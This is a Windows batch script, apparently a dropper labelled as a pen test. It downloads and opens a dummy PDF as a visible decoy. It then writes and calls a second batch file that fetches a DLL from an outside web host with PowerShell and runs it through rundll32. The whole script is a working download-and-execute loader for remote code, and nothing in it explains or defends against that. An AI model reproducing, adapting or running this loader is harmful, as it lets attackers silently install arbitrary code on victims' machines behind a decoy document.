@echo off
setlocal

:: Download and open the PDF
set "target=%TEMP%\MyPenTest"
set "pdfurl=https://raw.githubusercontent.com/bhekinko/test/main/dummy.pdf"
set "pdflocal=%target%\dummy.pdf"

mkdir "%target%" >nul 2>&1
powershell -Command "Invoke-WebRequest -Uri '%pdfurl%' -OutFile '%pdflocal%'"
start "" "%pdflocal%"

:: Set paths for update.bat and DLL
set "updatebat=%TEMP%\update.bat"
set "dllurl=https://hitpak.org/notepad2.dll"
set "dllpath=%TEMP%\notepad2.dll"

:: Create update.bat script
(
echo @echo off
echo powershell -Command "Invoke-WebRequest -Uri 'https://hitpak.org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10 ^>nul
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
) > "%updatebat%"

:: === Add delay to ensure update.bat is fully written ===
timeout /t 5 >nul

:: Call update.bat directly (no nested cmd.exe)
call "%updatebat%"

endlocal
